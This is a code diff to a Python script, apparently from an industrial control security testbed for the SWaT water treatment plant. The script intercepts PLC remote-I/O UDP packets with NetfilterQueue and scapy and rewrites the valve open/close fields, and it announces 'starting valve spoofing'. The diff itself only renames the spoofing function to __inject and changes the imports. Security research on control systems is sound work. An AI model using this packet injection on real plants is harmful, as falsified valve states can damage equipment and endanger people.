@@ -32,25 +32,25 @@ from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 
-import swat
+from swat.plc1 import SWAT_P1_RIO_DI, SWAT_P1_RIO_DO
 
 # Parameters list
 _valve_in = True  # True is open, False is close
 _valve_out = True  # True is open, False is close
 
 
-def __spoof(packet):
+def __inject(packet):
     pkt = IP(packet.get_payload())
-    if swat.SWAT_P1_RIO_DI in pkt:
-        pkt[swat.SWAT_P1_RIO_DI].valve_close = 0 if _valve_in else 1
-        pkt[swat.SWAT_P1_RIO_DI].valve_open = 1 if _valve_in else 0
+    if SWAT_P1_RIO_DI in pkt:
+        pkt[SWAT_P1_RIO_DI].valve_close = 0 if _valve_in else 1
+        pkt[SWAT_P1_RIO_DI].valve_open = 1 if _valve_in else 0
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
 
-    if swat.SWAT_P1_RIO_DO in pkt:
-        if pkt[swat.SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
-            pkt[swat.SWAT_P1_RIO_DO].valve_close = 0 if _valve_out else 1
-            pkt[swat.SWAT_P1_RIO_DO].valve_open = 1 if _valve_out else 0
+    if SWAT_P1_RIO_DO in pkt:
+        if pkt[SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
+            pkt[SWAT_P1_RIO_DO].valve_close = 0 if _valve_out else 1
+            pkt[SWAT_P1_RIO_DO].valve_open = 1 if _valve_out else 0
             del pkt[UDP].chksum  # Need to recompute checksum
             packet.set_payload(str(pkt))
 
@@ -60,7 +60,7 @@ def __spoof(packet):
 def start():
     __setup()
     nfqueue = NetfilterQueue()
-    nfqueue.bind(0, __spoof)
+    nfqueue.bind(0, __inject)
     try:
         print(datetime.datetime.now())
         print("[*] starting valve spoofing")
